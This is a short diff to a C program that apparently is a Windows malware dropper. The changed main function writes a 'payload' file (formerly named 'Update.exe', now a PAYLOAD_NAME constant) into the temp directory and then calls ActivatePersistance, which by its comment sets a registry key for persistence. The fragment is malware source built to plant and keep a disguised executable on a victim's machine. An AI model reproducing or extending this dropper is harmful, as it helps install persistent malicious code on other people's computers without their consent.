@@ -60,13 +60,17 @@ int main( void )
 		LOG_ERR( "GetTempPathW" );
 		return -1;
 	}
-	StrCatW( &tempPath, L"Update.exe" );
 
+	/* creating payload full path */
+	StrCatW( &tempPath, PAYLOAD_NAME );
+
+	/* writing payload to temp directory */
 	if ( !WritePayloadToTemp( tempPath ) )
 	{
 		return -1;
 	}
 
+	/* writing the persistance registry key */
 	if ( !ActivatePersistance() )
 	{
 		return -1;
